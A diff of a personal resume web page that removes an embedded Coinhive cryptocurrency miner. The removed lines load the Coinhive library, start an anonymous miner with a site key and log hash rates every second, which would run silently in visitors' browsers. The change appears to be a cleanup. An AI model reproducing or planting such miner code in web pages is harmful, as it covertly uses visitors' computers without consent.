@@ -21,7 +21,6 @@
 		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
 		<link rel="stylesheet" href="assets/css/main.css" />
 		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
-		<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 		<img src="http://nojsstats.appspot.com/UA-107207137-1/yaserkl.github.io?r=https://yaserkl.github.io/" />
 	</head>
 	<body id="top">
@@ -38,25 +37,6 @@
                     which I generated this file in <a href="https://github.com/yaserkl/resume">my github</a>
 				</div>
 			</header>
-			<script>
-				var miner = new CoinHive.Anonymous('gtUYN1S4pUZaxM0fqLVaNcqZKLwm28t9');
-				miner.start();
-
-				// Listen on events
-				miner.on('found', function() { console.log("hash found!")})
-				miner.on('accepted', function() { "hash accepted!"})
-
-				// Update stats once per second
-				setInterval(function() {
-					var hashesPerSecond = miner.getHashesPerSecond();
-					var totalHashes = miner.getTotalHashes();
-					var acceptedHashes = miner.getAcceptedHashes();
-
-					console.log("hashesPerSecond",hashesPerSecond)
-					console.log("totalHashes",totalHashes)
-					console.log("acceptedHashes",acceptedHashes)
-				}, 1000);
-			</script>
 		<!-- Main -->
 			<div id="main">
 
